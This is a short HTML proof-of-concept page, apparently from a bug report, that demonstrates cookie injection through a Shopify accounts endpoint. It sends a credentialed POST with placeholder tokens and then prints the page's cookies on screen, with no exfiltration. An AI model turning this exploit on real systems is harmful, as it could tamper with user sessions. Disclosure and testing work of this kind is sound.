<!DOCTYPE html>
<html>
<body>
<h1>Shopify Cookie Injection PoC</h1>
<script>
(async () => {
    // Step 1 — Trigger the vulnerable Shopify endpoint
    await fetch("https://accounts.shopify.com/.well-known/dux", {
        method: "POST",
        credentials: "include",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            multiTrackToken: "test",
            sessionToken: "test",
            enableActiveConsent: false,
            enableProtoEventForwarding: false,
            events: []
        })
    });

    // Step 2 — Read cookies set for your GitHub Pages domain
    const cookies = document.cookie;

    // Step 3 — Show cookies on screen (safe PoC — no exfiltration)
    document.body.innerHTML = "<h2>Cookies for this domain:</h2><pre>" + cookies + "</pre>";
})();
</script>
</body>
</html>
